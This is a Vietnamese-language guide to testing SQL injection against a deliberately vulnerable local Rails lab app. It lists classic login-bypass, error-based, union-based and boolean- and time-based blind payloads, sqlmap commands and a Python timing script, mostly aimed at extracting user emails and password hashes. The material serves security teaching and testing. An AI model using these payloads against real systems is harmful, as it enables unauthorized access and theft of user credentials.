# HƯỚNG DẪN TEST SQL INJECTION - CHI TIẾT

## Chuẩn bị test
1. **Khởi động server:** `rails s`
2. **Truy cập:** http://localhost:3000
3. **Tạo dữ liệu test:** Cần có ít nhất 1 user trong database

## Tạo dữ liệu test
```bash
# Vào Rails console
rails console

# Tạo admin user
User.create!(
  email: 'admin@example.com',
  password: 'password123',
  role: 'admin'
)

# Tạo user thường
User.create!(
  email: 'user@example.com', 
  password: 'password456',
  role: 'user'
)

# Tạo event để test
Event.create!(
  title: 'Test Event',
  description: 'This is a test event'
)
```

---

## 1. TEST CLASSIC SQLi (Bypass Login)

### URL: http://localhost:3000/sqli/classic

### Test cases:

#### ✅ Test 1: Bypass login cơ bản
```
Email: admin@example.com' OR '1'='1' --
Password: anything
```
**Kết quả mong đợi:** Login thành công mà không cần password đúng

#### ✅ Test 2: Comment-based bypass
```
Email: ' OR 1=1 #
Password: anything
```
**Kết quả mong đợi:** Login thành công

#### ✅ Test 3: Union-based bypass
```
Email: ' UNION SELECT 1,'admin@test.com','password' --
Password: anything  
```
**Kết quả mong đợi:** Login thành công với fake data

#### ❌ Test 4: Normal login (để so sánh)
```
Email: admin@example.com
Password: password123
```
**Kết quả mong đợi:** Login thành công với credential đúng

---

## 2. TEST ERROR-BASED SQLi 

### URL: http://localhost:3000/sqli/error-based

### Test cases:

#### ✅ Test 1: Lấy version database
```
User ID: 1 AND (SELECT @@version)
```
**Kết quả mong đợi:** Error message chứa MySQL version

#### ✅ Test 2: Lấy tên database
```
User ID: 1 AND (SELECT database())
```
**Kết quả mong đợi:** Error message chứa tên database

#### ✅ Test 3: Lấy tên bảng
```
User ID: 1 AND (SELECT table_name FROM information_schema.tables LIMIT 1)
```
**Kết quả mong đợi:** Error message chứa tên bảng đầu tiên

#### ✅ Test 4: Extract user email 
```
User ID: 1 AND (SELECT email FROM users WHERE id=1)
```
**Kết quả mong đợi:** Error message chứa email của user

#### ✅ Test 5: Duplicate key error
```
User ID: 1 AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)
```
**Kết quả mong đợi:** Duplicate entry error với tên database

---

## 3. TEST UNION-BASED SQLi

### URL: http://localhost:3000/sqli/union

### Test cases:

#### ✅ Test 1: Xác định số cột
```
Search: ' UNION SELECT NULL--
Search: ' UNION SELECT NULL,NULL--  
Search: ' UNION SELECT NULL,NULL,NULL--
```
**Kết quả mong đợi:** Không lỗi với 3 cột

#### ✅ Test 2: Lấy version & database info
```
Search: ' UNION SELECT 1,@@version,database()--
```
**Kết quả mong đợi:** Hiển thị version và database name trong kết quả

#### ✅ Test 3: Lấy danh sách bảng
```
Search: ' UNION SELECT 1,table_name,'table_info' FROM information_schema.tables WHERE table_schema=database()--
```
**Kết quả mong đợi:** Hiển thị tên các bảng

#### ✅ Test 4: Lấy thông tin user
```
Search: ' UNION SELECT id,email,role FROM users--
```
**Kết quả mong đợi:** Hiển thị thông tin tất cả users

#### ✅ Test 5: Lấy password hash
```
Search: ' UNION SELECT id,email,password_digest FROM users--
```
**Kết quả mong đợi:** Hiển thị password hash của users

#### ✅ Test 6: Lấy chỉ admin users
```
Search: ' UNION SELECT id,email,role FROM users WHERE role='admin'--
```
**Kết quả mong đợi:** Chỉ hiển thị admin users

---

## 4. TEST BOOLEAN-BASED BLIND SQLi

### URL: http://localhost:3000/sqli/blind

### Test cases:

#### ✅ Test 1: Test cơ bản TRUE/FALSE
```
Email: admin@test.com' OR '1'='1'--
```
**Kết quả mong đợi:** "Email exists" (luôn TRUE)

```
Email: admin@test.com' AND '1'='2'--  
```
**Kết quả mong đợi:** "Email does not exist" (luôn FALSE)

#### ✅ Test 2: Kiểm tra độ dài database name
```
Email: admin@test.com' AND LENGTH(database())=20--
Email: admin@test.com' AND LENGTH(database())=25--
Email: admin@test.com' AND LENGTH(database())=30--
```
**Cách đọc kết quả:** Nếu độ dài đúng → "Email exists", sai → "Email does not exist"

#### ✅ Test 3: Đoán ký tự đầu của database
```
Email: admin@test.com' AND SUBSTRING(database(),1,1)='s'--
Email: admin@test.com' AND SUBSTRING(database(),1,1)='t'--
Email: admin@test.com' AND SUBSTRING(database(),1,1)='a'--
```
**Cách đọc kết quả:** Ký tự đúng → "Email exists"

#### ✅ Test 4: Kiểm tra số lượng user
```
Email: admin@test.com' AND (SELECT COUNT(*) FROM users)>0--
Email: admin@test.com' AND (SELECT COUNT(*) FROM users)>5--
Email: admin@test.com' AND (SELECT COUNT(*) FROM users)>10--
```

#### ✅ Test 5: Đoán email admin
```
Email: admin@test.com' AND (SELECT SUBSTRING(email,1,1) FROM users WHERE role='admin' LIMIT 1)='a'--
Email: admin@test.com' AND (SELECT SUBSTRING(email,1,1) FROM users WHERE role='admin' LIMIT 1)='u'--
```

---

## 5. TEST TIME-BASED BLIND SQLi

### URL: http://localhost:3000/sqli/time-based

### Test cases:

#### ✅ Test 1: Test delay cơ bản
```
Email: admin@test.com' AND IF(1=1,SLEEP(3),0)--
```
**Kết quả mong đợi:** Response time > 3000ms

```
Email: admin@test.com' AND IF(1=2,SLEEP(3),0)--
```
**Kết quả mong đợi:** Response time < 500ms

#### ✅ Test 2: Kiểm tra MySQL version
```
Email: admin@test.com' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)--
Email: admin@test.com' AND IF(SUBSTRING(@@version,1,1)='8',SLEEP(3),0)--
```
**Cách đọc:** Version đúng → delay 3 giây

#### ✅ Test 3: Đoán tên database
```
Email: admin@test.com' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)--
Email: admin@test.com' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(3),0)--
```

#### ✅ Test 4: Kiểm tra password hash format
```
Email: admin@test.com' AND IF((SELECT SUBSTRING(password_digest,1,1) FROM users LIMIT 1)='$',SLEEP(3),0)--
```
**Kết quả mong đợi:** Delay nếu password dùng bcrypt (bắt đầu bằng $)

#### ✅ Test 5: Kiểm tra có admin không
```
Email: admin@test.com' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(3),0)--
```

---

## CÁCH ĐỌC KẾT QUẢ

### Classic SQLi:
- **Thành công:** Redirect tới trang chủ với thông báo "Login successful"
- **Thất bại:** Ở lại trang login với "Invalid credentials"

### Error-based SQLi:
- **Thành công:** Thông báo lỗi chứa thông tin database
- **Thất bại:** Không có lỗi hoặc lỗi generic

### Union-based SQLi:
- **Thành công:** Dữ liệu từ database khác xuất hiện trong kết quả search
- **Thất bại:** Lỗi SQL hoặc không có kết quả

### Boolean-based Blind SQLi:
- **TRUE condition:** "Email exists in database"  
- **FALSE condition:** "Email does not exist"

### Time-based Blind SQLi:
- **TRUE condition:** Response time > 3000ms
- **FALSE condition:** Response time < 500ms

---

## TOOLS HỖ TRỢ TEST

### 1. Burp Suite
- Intercept requests
- Modify payloads
- Analyze responses

### 2. SQLMAP
```bash
# Test login form
sqlmap -u "http://localhost:3000/sessions" --data="email=test&password=test" --dbs

# Test specific parameter
sqlmap -u "http://localhost:3000/sqli/error-based?user_id=1" --dbs
```

### 3. Browser Developer Tools
- Network tab để xem request/response
- Console để check thời gian phản hồi

### 4. Python script tự động
```python
import requests
import time

def test_time_based_sqli():
    url = "http://localhost:3000/sqli/time-based"
    
    # Test TRUE condition
    payload = "admin@test.com' AND IF(1=1,SLEEP(3),0)--"
    start = time.time()
    response = requests.get(url, params={'email': payload})
    duration = time.time() - start
    
    print(f"TRUE condition: {duration:.2f}s")
    
    # Test FALSE condition  
    payload = "admin@test.com' AND IF(1=2,SLEEP(3),0)--"
    start = time.time()
    response = requests.get(url, params={'email': payload})
    duration = time.time() - start
    
    print(f"FALSE condition: {duration:.2f}s")

test_time_based_sqli()
```

---

## CHECKLIST TEST HOÀN CHỈNH

- [ ] **Classic SQLi:** Test bypass login với 3 payloads khác nhau
- [ ] **Error-based SQLi:** Test 5 payloads để extract thông tin
- [ ] **Union-based SQLi:** Test từ xác định cột đến extract data
- [ ] **Boolean Blind SQLi:** Test TRUE/FALSE và đoán thông tin
- [ ] **Time-based Blind SQLi:** Test delay và đoán thông tin
- [ ] **Document kết quả:** Ghi lại payload nào work, payload nào không
- [ ] **Test phòng chống:** Thử các payload trên version đã fix

Chúc bạn test thành công! 🔐
